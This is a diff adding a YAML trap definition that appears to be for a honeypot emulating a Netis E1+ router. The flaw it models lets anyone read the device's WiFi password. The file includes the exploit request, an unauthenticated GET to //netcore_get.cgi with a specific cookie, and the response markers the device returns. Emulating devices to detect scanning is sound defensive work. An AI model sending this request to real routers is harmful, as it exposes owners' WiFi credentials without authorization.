@@ -1,0 +1,28 @@
+id: netis-info-leak
+info:
+  name: Netis E1+ V1.2.32533 - WiFi Password Disclosure
+  author: gy741
+  description: A vulnerability in Netis allows remote unauthenticated users to disclose
+    the WiFi password of the remote device.
+  severity: high
+  reference:
+  - https://www.exploit-db.com/exploits/48384
+  - https://www.netis-systems.com/
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-200
+  metadata:
+    max-request: 1
+  tags: netis,exposure,edb
+traps:
+- request:
+    method: GET
+    path: //netcore_get.cgi
+    headers:
+      Cookie: homeFirstShow=yes
+    body: ''
+  response:
+    status_code: 200
+    headers: {}
+    body: rp_ap_passwordrp_ap_ssid
